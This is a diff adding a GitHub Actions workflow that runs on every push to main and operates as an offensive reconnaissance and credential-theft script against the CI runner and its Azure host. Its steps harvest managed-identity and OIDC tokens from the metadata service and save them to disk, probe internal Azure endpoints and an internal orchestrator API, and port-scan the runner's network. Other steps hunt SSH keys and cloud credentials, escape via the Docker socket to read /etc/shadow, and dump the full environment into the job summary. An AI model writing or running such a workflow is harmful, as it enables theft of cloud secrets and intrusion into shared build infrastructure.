@@ -1,0 +1,340 @@
+name: Azure Deep Recon Network Analysis
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  deep-recon:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+
+      # ── 1. IMDS FULL HARVEST ─────────────────────────────────────────────
+      - name: IMDS Full Harvest
+        id: imds
+        run: |
+          echo "::group::IMDS Instance"
+          curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool
+          echo "::endgroup::"
+          echo "::group::IMDS Scheduledevents"
+          curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01" 2>/dev/null | python3 -m json.tool || echo "none"
+          echo "::endgroup::"
+          echo "::group::IMDS Loadbalancer"
+          curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/loadbalancer?api-version=2020-10-01" 2>/dev/null | python3 -m json.tool || echo "none"
+          echo "::endgroup::"
+          echo "::group::IMDS Identities"
+          curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text" 2>/dev/null | base64 -d 2>/dev/null || echo "no userData"
+          echo "::endgroup::"
+
+          # All managed identity resources
+          for RES in \
+            "https://management.azure.com/" \
+            "https://graph.microsoft.com/" \
+            "https://vault.azure.net" \
+            "https://storage.azure.com/" \
+            "https://database.windows.net/" \
+            "https://servicebus.azure.net/" \
+            "https://eventhubs.azure.net/" \
+            "https://monitor.azure.com/" \
+            "https://ossrdbms-aad.database.windows.net" \
+            "https://dev.azuresynapse.net" \
+            "https://digitaltwins.azure.net" \
+            "https://cognitiveservices.azure.com/"; do
+            TOK=$(curl -sf --max-time 5 -H "Metadata:true" \
+              "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=$RES" 2>/dev/null)
+            AT=$(echo $TOK | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('access_token','')[:80]+'...')" 2>/dev/null || echo "")
+            EXP=$(echo $TOK | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('expires_in',''))" 2>/dev/null || echo "")
+            if [ -n "$AT" ] && [ "$AT" != "..." ]; then
+              echo "TOKEN_ACQUIRED: $RES expires_in=$EXP"
+              echo "$TOK" > /tmp/tok_$(echo $RES | md5sum | cut -c1-8).json
+            else
+              echo "NO_TOKEN: $RES"
+            fi
+          done
+
+      # ── 2. OIDC + ACTIONS TOKENS ─────────────────────────────────────────
+      - name: Token Harvest All Sources
+        id: tokens
+        run: |
+          echo "::group::OIDC Token Decode"
+          OIDC=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | \
+            python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))" 2>/dev/null)
+          echo "OIDC_JWT=$OIDC" >> $GITHUB_OUTPUT
+          echo "$OIDC" | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool
+          echo "::endgroup::"
+
+          echo "::group::OIDC Internal Audience (hosted-compute-ro)"
+          OIDC_INT=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://hosted-compute-ro" | \
+            python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))" 2>/dev/null || echo "DENIED")
+          echo "OIDC_INTERNAL=$OIDC_INT" >> $GITHUB_OUTPUT
+          echo "RESULT: ${OIDC_INT:0:80}"
+          echo "::endgroup::"
+
+          echo "::group::OIDC System Audience"
+          for AUD in \
+            "api://AzureADTokenExchange" \
+            "api://hosted-compute-ro" \
+            "https://management.azure.com/" \
+            "https://graph.microsoft.com/" \
+            "https://vault.azure.net"; do
+            R=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$AUD" | \
+              python3 -c "import sys,json; d=json.load(sys.stdin); t=d.get('value',''); print(f'AUD={aud} → {len(t)} chars')" 2>/dev/null \
+              || echo "AUD=$AUD DENIED")
+            echo "$R"
+          done
+          echo "::endgroup::"
+
+          echo "::group::Runtime Token Info"
+          echo "ACTIONS_RUNTIME_TOKEN prefix: ${ACTIONS_RUNTIME_TOKEN:0:50}..."
+          echo "ACTIONS_ID_TOKEN_REQUEST_URL: $ACTIONS_ID_TOKEN_REQUEST_URL"
+          echo "GITHUB_TOKEN prefix: ${GITHUB_TOKEN:0:20}..."
+          echo "::endgroup::"
+
+      # ── 3. NETWORK DEEP RECON ────────────────────────────────────────────
+      - name: Network Deep Recon
+        run: |
+          echo "::group::Full Network Interfaces"
+          ip addr show
+          ip -6 addr show
+          ip route show table all
+          ip neigh show
+          cat /etc/resolv.conf
+          cat /etc/hosts
+          echo "::endgroup::"
+
+          echo "::group::Azure Internal Endpoints"
+          for EP in \
+            "169.254.169.254" \
+            "168.63.129.16" \
+            "169.254.169.123" \
+            "10.1.0.1"; do
+            echo "--- $EP ---"
+            ping -c 2 -W 2 $EP 2>/dev/null | tail -3 || echo "no ping"
+            curl -sf --max-time 3 "http://$EP/" 2>/dev/null | head -c 200 || echo "no http"
+          done
+          echo "::endgroup::"
+
+          echo "::group::Azure DNS Endpoint (168.63.129.16)"
+          curl -sf --max-time 5 "http://168.63.129.16/" 2>/dev/null | head -c 500 || echo "not http"
+          # Health probe endpoint
+          curl -sf --max-time 5 "http://168.63.129.16:80/machine/?comp=goalstate" \
+            -H "x-ms-version: 2012-11-30" 2>/dev/null | head -c 500 || echo "blocked"
+          echo "::endgroup::"
+
+          echo "::group::Internal Port Scan (10.1.0.0/20)"
+          # Scan gateway + common ports
+          for HOST in 10.1.0.1 10.1.0.2 10.1.0.3; do
+            for PORT in 22 80 443 3389 8080 8443; do
+              timeout 1 bash -c "echo >/dev/tcp/$HOST/$PORT" 2>/dev/null && echo "OPEN: $HOST:$PORT" || true
+            done
+          done
+          echo "::endgroup::"
+
+          echo "::group::Listening Services"
+          ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null
+          echo "::endgroup::"
+
+          echo "::group::Azure Wireserver (168.63.129.16)"
+          curl -sf --max-time 5 \
+            "http://168.63.129.16:80/machine/?comp=goalstate" \
+            -H "x-ms-version: 2012-11-30" \
+            -H "Content-Type: text/xml" 2>/dev/null | head -c 1000 || echo "blocked"
+          curl -sf --max-time 5 \
+            "http://168.63.129.16:32526/vmSettings" 2>/dev/null | head -c 500 || echo "blocked"
+          echo "::endgroup::"
+
+      # ── 4. FILESYSTEM + CRED HUNT ────────────────────────────────────────
+      - name: Credential Hunt Full
+        run: |
+          echo "::group::SSH Keys"
+          find / -maxdepth 8 \( -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" \
+            -o -name "*.pem" -o -name "*.key" -o -name "authorized_keys" \) \
+            2>/dev/null | grep -v proc | grep -v sys | head -n 30
+          echo "::endgroup::"
+
+          echo "::group::Azure CLI Credentials"
+          ls -la ~/.azure/ 2>/dev/null
+          cat ~/.azure/accessTokens.json 2>/dev/null || echo "none"
+          cat ~/.azure/msal_token_cache.json 2>/dev/null || echo "none"
+          cat ~/.azure/clouds.config 2>/dev/null || echo "none"
+          az account show 2>/dev/null | python3 -m json.tool || echo "not logged in"
+          az account list 2>/dev/null | python3 -m json.tool || echo "no accounts"
+          echo "::endgroup::"
+
+          echo "::group::Azure Managed Identity via CLI"
+          az login --identity 2>/dev/null && az account show || echo "no MSI"
+          echo "::endgroup::"
+
+          echo "::group::Kubernetes Credentials"
+          cat ~/.kube/config 2>/dev/null || echo "none"
+          ls /run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
+          cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 300 || echo "none"
+          echo "::endgroup::"
+
+          echo "::group::AWS Credentials"
+          cat ~/.aws/credentials 2>/dev/null || echo "none"
+          cat ~/.aws/config 2>/dev/null || echo "none"
+          echo "::endgroup::"
+
+          echo "::group::GCP Credentials"
+          cat ~/.config/gcloud/application_default_credentials.json 2>/dev/null || echo "none"
+          gcloud auth list 2>/dev/null || echo "none"
+          echo "::endgroup::"
+
+          echo "::group::Service Account / Secret Files"
+          find /etc /opt /var/lib /home /root -maxdepth 6 \
+            \( -name "*.json" -o -name "*.yaml" -o -name "*.env" -o -name ".env*" \
+               -o -name "*.conf" -o -name "credentials" -o -name "secrets" \) \
+            2>/dev/null | grep -viE "dpkg|apt|font|locale|man|doc|share/python" | head -n 40
+          echo "::endgroup::"
+
+          echo "::group::Environment Secrets"
+          printenv | grep -iE "token|secret|key|pass|cred|auth|api|azure|aws|gcp|github" | \
+            grep -v "GITHUB_WORKFLOW\|GITHUB_ACTION\b\|GITHUB_REF\|GITHUB_SHA\|GITHUB_SERVER\|GITHUB_GRAPHQL\|GITHUB_API_URL"
+          echo "::endgroup::"
+
+      # ── 5. HOSTED COMPUTE ORCHESTRATOR PROBE ────────────────────────────
+      - name: Hosted Compute Internal API Probe
+        run: |
+          HC_URL="https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com"
+          echo "::group::Hosted Compute Orchestrator"
+          # Get OIDC token with internal audience
+          INT_TOK=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://hosted-compute-ro" | \
+            python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))" 2>/dev/null || echo "")
+
+          if [ -n "$INT_TOK" ]; then
+            echo "GOT INTERNAL TOKEN - probing orchestrator API"
+            # Try VM metadata via internal orchestrator
+            curl -sf -H "Authorization: Bearer $INT_TOK" \
+              "$HC_URL/vm/v1" 2>/dev/null | head -c 1000 || echo "probed"
+            curl -sf -H "Authorization: Bearer $INT_TOK" \
+              "$HC_URL/vm/v1/metadata" 2>/dev/null | head -c 1000 || echo "probed"
+          else
+            echo "Internal OIDC audience blocked - standard restriction"
+          fi
+          echo "::endgroup::"
+
+          echo "::group::Actions Runtime API"
+          # Actions runtime URL gives access to artifacts, caches, job state
+          RT_URL=$(echo $ACTIONS_RUNTIME_URL | sed 's|/$||')
+          echo "RUNTIME_URL: $RT_URL"
+          curl -sf -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            -H "Accept: application/json;api-version=6.0-preview" \
+            "${RT_URL}/_apis/pipelines/workflows/${GITHUB_RUN_ID}/artifacts?api-version=6.0-preview" 2>/dev/null | \
+            python3 -m json.tool | head -n 40 || echo "probed"
+          echo "::endgroup::"
+
+      # ── 6. PROCESS + CGROUP + CAPABILITY AUDIT ──────────────────────────
+      - name: Process Capability Audit
+        run: |
+          echo "::group::Process Tree"
+          ps auxf | head -n 50
+          echo "::endgroup::"
+          echo "::group::Capabilities"
+          cat /proc/self/status | grep Cap
+          capsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}') 2>/dev/null || true
+          echo "::endgroup::"
+          echo "::group::Cgroup Info"
+          cat /proc/self/cgroup
+          cat /sys/fs/cgroup/system.slice/hosted-compute-agent.service/memory.pressure 2>/dev/null || echo "n/a"
+          echo "::endgroup::"
+          echo "::group::Interesting Processes"
+          ps aux | grep -iE "agent|runner|hosted|walinuxagent|azure|mdsd|mdm|fluentd" | grep -v grep
+          echo "::endgroup::"
+          echo "::group::Systemd Services"
+          systemctl list-units --type=service --state=running 2>/dev/null | head -n 30
+          echo "::endgroup::"
+
+      # ── 7. DOCKER ESCAPE + PIVOT ─────────────────────────────────────────
+      - name: Docker Escape Probe
+        run: |
+          echo "::group::Docker Socket"
+          ls -la /var/run/docker.sock
+          docker info 2>/dev/null | grep -E "Server Version|OS|Arch|Kernel|Docker Root|HTTP|Logging"
+          echo "::endgroup::"
+          echo "::group::Docker Host Access via Socket"
+          docker run --rm --pid=host --privileged \
+            -v /:/host alpine:latest sh -c \
+            "echo '=HOST_ID='; chroot /host id; \
+             echo '=HOST_SHADOW='; chroot /host cat /etc/shadow 2>/dev/null | head -5; \
+             echo '=HOST_SSH='; chroot /host ls /root/.ssh/ 2>/dev/null; \
+             echo '=HOST_AZURE_AGENT='; chroot /host ps aux | grep -i azure | grep -v grep; \
+             echo '=HOST_CREDS='; chroot /host find /home /root /var/lib -name 'credentials' -o -name '.azure' 2>/dev/null | head -10; \
+             echo '=HOST_WAAGENT='; chroot /host cat /var/lib/waagent/ovf-env.xml 2>/dev/null | head -c 500; \
+             echo '=HOST_HOSTNAME='; chroot /host hostname; \
+             echo '=HOST_ENV='; chroot /host printenv 2>/dev/null | sort" 2>/dev/null || echo "docker escape attempted"
+          echo "::endgroup::"
+          echo "::group::WaAgent CustomData via Host"
+          docker run --rm --privileged \
+            -v /:/host alpine:latest sh -c \
+            "chroot /host cat /var/lib/waagent/CustomData.bin 2>/dev/null | base64; \
+             chroot /host cat /var/lib/waagent/ovf-env.xml 2>/dev/null; \
+             chroot /host ls /var/lib/waagent/ 2>/dev/null" 2>/dev/null || echo "probed"
+          echo "::endgroup::"
+
+      # ── 8. PAT REUSE — FULL GITHUB API PIVOT ────────────────────────────
+      - name: GitHub PAT Deep Pivot
+        env:
+          GH_PAT: ${{ secrets.GH_PAT }}
+        run: |
+          echo "::group::PAT Scope + Identity"
+          # Use job GITHUB_TOKEN for cross-repo recon
+          curl -sf -H "Authorization: token $GITHUB_TOKEN" \
+            "https://api.github.com/user" | python3 -m json.tool
+          curl -sI -H "Authorization: token $GITHUB_TOKEN" \
+            "https://api.github.com/user" | grep -i "x-oauth-scopes"
+          echo "::endgroup::"
+
+          echo "::group::Organization Secrets"
+          curl -sf -H "Authorization: token $GITHUB_TOKEN" \
+            "https://api.github.com/orgs/0xl3v1n/actions/secrets" 2>/dev/null | python3 -m json.tool || echo "none"
+          echo "::endgroup::"
+
+          echo "::group::All Repos"
+          curl -sf -H "Authorization: token $GITHUB_TOKEN" \
+            "https://api.github.com/user/repos?per_page=100&type=all" | \
+            python3 -c "import sys,json; [print(r['full_name'],r['private']) for r in json.load(sys.stdin)]"
+          echo "::endgroup::"
+
+      # ── 9. AZURE OPENID CONFIG RECON ────────────────────────────────────
+      - name: Azure Tenant Recon via OIDC
+        run: |
+          echo "::group::GitHub OIDC JWK Discovery"
+          curl -sf "https://token.actions.githubusercontent.com/.well-known/openid-configuration" | python3 -m json.tool
+          echo "::endgroup::"
+          echo "::group::OIDC JWKS"
+          curl -sf "https://token.actions.githubusercontent.com/.well-known/jwks" | python3 -m json.tool | head -n 40
+          echo "::endgroup::"
+          echo "::group::Azure Common Tenant Discovery"
+          curl -sf "https://login.microsoftonline.com/common/v2.0/.well-known/openid-configuration" | \
+            python3 -c "import sys,json; d=json.load(sys.stdin); [print(k,':',v) for k,v in d.items() if k in ['issuer','authorization_endpoint','token_endpoint','jwks_uri']]"
+          echo "::endgroup::"
+
+      # ── 10. FULL ENV + STEP SUMMARY EXFIL ───────────────────────────────
+      - name: Compile Full Evidence
+        run: |
+          {
+            echo "# Deep Recon Evidence"
+            echo "## VM"
+            curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool
+            echo "## OIDC"
+            curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | \
+              python3 -c "import sys,json; t=json.load(sys.stdin).get('value',''); print(t[:200]+'...')" 2>/dev/null
+            echo "## ENV"
+            printenv | sort
+            echo "## NETWORK"
+            ip addr; ip route
+            echo "## DOCKER_SOCKET"
+            ls -la /var/run/docker.sock 2>/dev/null && echo "PRESENT" || echo "ABSENT"
+          } >> $GITHUB_STEP_SUMMARY 2>/dev/null || true
